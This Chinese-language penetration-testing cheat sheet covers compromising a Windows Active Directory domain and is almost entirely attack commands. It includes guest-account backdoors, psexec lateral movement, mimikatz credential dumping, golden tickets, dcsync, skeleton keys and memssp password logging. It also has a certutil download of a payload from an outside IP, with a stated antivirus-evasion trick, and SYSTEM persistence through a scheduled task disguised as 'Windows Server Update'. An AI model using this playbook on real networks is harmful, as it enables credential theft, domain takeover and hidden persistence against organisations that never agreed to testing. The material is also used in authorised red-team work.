# Intranet

---

## window域介绍

域计算机登录到域时，身份验证是采用kerberos协议在域控制器上进行，登录到此计算机时通过SAM来进行NTLM验证

一般域成员可以登录到域中所有工作站，不包括域控制器，管理员在域中可以设置用户登录可以登录到哪些计算机



## 流程

目的：拿到了域成员的控制权，通过域信息、登录IP次数出现最多的，定位域控、从其他的域计算机中抓取域管理员密码，然后拿下域控

1.找域控：

```
dsquery server                          #等等域控的主机名，如WIN-KMZ8MFWF5L8

net group "domain controllers" /domain  #得到WIN-KMZ8MFWF5L8$(去掉$)

net view                                #查看视图，备注servidor master ad 域控、dns域控可能性很大

ping 主机名                             #ping域控的主机名， 得到域控IP

net group "domain admins" /domain      #找域管理员

net user /domain    |net user 域用户 /domain    #找域所有成员
```

其他信息查看：

```
（net config workstation  #查询当前登录域  如pico.local

​    net accounts /domain   #查询域密码策略

​    net view /domain     #查看所有域

​    net view /domain:域名称 查看域内用户

​    net group "domain computers" /domain   #查看当前域的计算机列表

​    wmic qfe          #查询补丁信息

​    wmic os           #查看操作系统类型）
```

guest用户隐藏

```
net user  guest  /active:yes                      #激活guest用户

net localgroup  administrators  guest  /add       #将guest用户添加到

net user guest    密码                            #更改guest用户密码

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口
```

2.因为整个内网很多台计算机，每个计算机的本地管理员的帐号和密码都是一样，除了域控（域控也可以试试），所以我们得到了本地管理员帐号密码的话可以直接使用登录其他计算机，并找出域管理员登录过的域计算机，就算注销掉也可以从内存中抓取密码hash

```
psexec \\IP -u administrator -p 密码 cmd  #获取IP的超级管理员的cmd

tasklist /v |find "域管理员名"
```

or

```
tasklist /s IP /u administrator /p 密码 /v |find "域用户名" #远程查看进程
```

批量操作：

```
psexec -accepteula @ip.txt -u administrator -p 密码 -c 1.bat

（ip.txt是ip ，1.bat是tasklist的指令）
```



3.找到域管理员登录过的IP的计算机进行登录，使用mimikatz抓取内存的密码

```
mimikatz log "privilege::debug" "lsadump::lsa /patch"  #pth攻击

mimikatz（管理员权限下运行）

kerberos::golden /user:域用户名 /domain:域名 /sid:   /krbtgt:密码hash    /ticket:test.kirbi

kerberos::ptt test.kirbi

在在另一个cmd中

klist   #查看缓存的票据

dir \\WIN-KMZ8MFWF5L8.pico.local\c$     #域控主机名.域名，使用票据传递进行查看
```

or

```
mimikatz
：：获取帮助
Privilege：：debug        提升权限
Sekurlsa：：logonpasswords 抓取密码
查看本地用户密码
```

or

```
dcsuync功能利用它可以从目录复制服务（DRS）的NTDS.DIT文件中检索密码哈希值。该项技术省去了直接使用域控制器进行身份验证的过程，因为它可以通过域管理员的权限从域的任何系统执行

lsadump::dcsync /domain:pentestlab.local /all /csv
```





4.如果dump不出域控密码，使用远程RPC请求，允许执行远程代码

```
魔波利用ms06-040  缓冲区溢出  针对netapi组件  

如果是域控是windows xp/2000/2003/2008等 可以是用ms08-067  针对netapi组件

wannacry利用ms17-010永恒之蓝攻击445传播病毒
```

可以在github上搜ms的扫描器

------------------------------------------------

## 内网穿透

[frp](https://p-t001.github.io/test_long/Penetration_test/test_soft/Intranet/Frp.html)



## dump超管密码

内网一般是windows系统

[mimakatz](https://p-t001.github.io/test_long/Penetration_test/test_soft/Intranet/mimakatz.html)



域信息收集

```
systeminfo   #看计算机信息、域、补丁
net time /domain  # 一般域控也做时间服务器，如果有代表在域里
net config workstation #工作域为域名，如果为WORKGROUP表示未域环境，登陆域表示当前用户是域用户（域名）还是本地用户（本地是计算机名）
net group “domain admins” /domain #定位域管理员名
域管：域名/域管理员名

net group “domain controllers” /domain  #在与里面能看到域控名$
ping 域控名  #能定位IP

net use \\域控名
net view \\域控名  # 查看域控共享的设备
dir \\域控名\xxxx  # 查看域控共享的文件
```



进行下载(下载并重名名成nice.exe，&是为了绕过杀软)

```
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe
加上delete就不会产生缓存文件
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe delete
查看缓存文件：certutil -urlcache *
删除缓存文件：certutil -urlcache * delete
```

定时任务使windows服务器上线,apt持久化

```
schtasks /create /RL HIGHEST /F /tn "Windows Server Update" /tr "c:\windows\Temp\xxx.exe" /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM
```

使用cs查看进程,如果有域管使用的进程,,在cs中注入进程让域管上线

```
beacon> inject 进程号 x64 http-ip
```

域管状态下与域控简历IPC共享

```
net use \\IP # 简历IPC连接
dir \\IP\c$  # 列出c盘共享
```

cs中能使用端口扫描功能进行内网扫描

```
portscan 192.168.2.0-192.168.2.254 1-1024,3389 arp 1024
```

ssp记录登陆当前机器的所以账号密码

```
beacon> mimikatz privilege::debug
beacon> mimikatz misc::memssp
beacon> shell type C:\Windows\System32\mimilsa.log
有人登陆成功:
beacon> shell type C:\Windows\System32\mimilsa.log # 查看文件内容
```

Skeleton Key - 万能密码

```
beacon> mimikatz privilege::debug
beacon> mimikatz misc::skeleton
可以通过:  账号:域名\administrator 密码:mimikatz 连接IPC
beacon> shell net use \\xxxxx-PDM\c$ /user:"a-xxxxx\administrator" "mimikatz"
beacon> shell dir \\xxxxx-PDM\c$
```

nbtscan内网存活扫描,并显示IP，主机名(加入域会域名+主机名)，用户名称和MAC地址

- https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4

```
nbtscan -r x.x.x.x/24
```



来源:https://xz.aliyun.com/t/9816

